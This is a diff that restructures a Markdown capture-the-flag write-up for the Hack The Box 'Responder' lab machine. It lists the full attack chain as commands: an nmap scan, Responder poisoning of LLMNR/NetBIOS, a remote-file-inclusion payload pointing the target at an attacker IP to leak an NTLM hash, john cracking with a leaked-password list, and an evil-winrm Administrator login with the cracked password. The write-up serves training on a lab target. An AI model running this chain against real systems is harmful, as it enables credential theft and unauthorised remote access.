@@ -1,32 +1,46 @@
-# reconnaissance
-## nmap scan
-- [nmap scan](./evidences/nmap.txt)
-- nmap -sV unika.htb -oN nmap.txt
-- Apache web server on port 80/tcp
-- WinRM server on port 5985/tcp
+# Overview
+**Difficulty:** Very Easy  
+**Skills:** RFI, responder, ntlm-relay, password cracking, winrm  
+**HTB Link:** https://app.hackthebox.com/starting-point  
+**Summary:** Capture NTLM via LLMNR/NetBIOS poisoning and RFI, crack NTLM hash, log to WinRM to obtain admin shell.
 
-# resource development
-## responder tool
-- [NTLM hash](./evidences/ntlm_hash.png)
-- responder -I tun0
-- listening on the interface connected to the LAN of the target for LLMNR (Link Local Multicast Neighbor Resolution)
-- so that we can get the username and HASH (MD4) used to authenticate via NTLM
+---
 
-# initial access
-## remote-file-intrusion
+# Steps
+
+## 1. Reconnaissance
+### Nmap scan
+- [nmap scan](./evidences/nmap.txt)  
+- `nmap -sV unika.htb -oN nmap.txt`  
+- Apache web server on port `80/tcp`  
+- WinRM server on port `5985/tcp`
+
+---
+
+## 2. Resource Development
+### Responder tool
+- [NTLM hash](./evidences/ntlm_hash.png)  
+- `responder -I tun0`  
+- Listening for LLMNR/NetBIOS name resolution requests, to capture NTLM challenge hash (username:MD4 hash of password).
+
+---
+
+## 3. Initial Access
+### Remote File Intrusion (RFI)
 - [RFI command](./evidences/remote_file_intrusion.png)
-- index.php?page=//10.10.14.78/test
-- the responder logs are stored in: /usr/share/responder/log
-- the hash inside the log is saved inside [NTLM hash] (./evidences/hash.txt)
+- triggers the LLMNR/NetBIOS Name Resolution Request.  
+- We get from responder the [NTLM hash](./evidences/hash.txt)
 
-## hash crack
-- [NTLM hash cracked](./evidences/hash_cracking.png)
-- john --wordlist=/usr/share/wordlist/seclists/Passwords/Leaked-Databases/rockyou-75.txt ./evidences/hash.txt
+### Hash Crack
+- [NTLM hash cracked](./evidences/hash_cracking.png)  
+- `john --wordlist=/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou-75.txt ./evidences/hash.txt`
 
-## WinRM access
-- [WinRM shell access](./evidences/WinRM_access.png)
-- evil-winrm -i unika.htb -u Administrator -p badminton
+### WinRM Access
+- [WinRM shell access](./evidences/WinRM_access.png)  
+- `evil-winrm -i unika.htb -u Administrator -p badminton`
 
-# privilege escalation
-- [root flag](./evidences/root_flag.png)
-- cat C:\Users\mike\Desktop\flag.txt
+---
+
+## 4. Privilege Escalation
+- [root flag](./evidences/root_flag.png)  
+- `cat C:\Users\mike\Desktop\flag.txt`
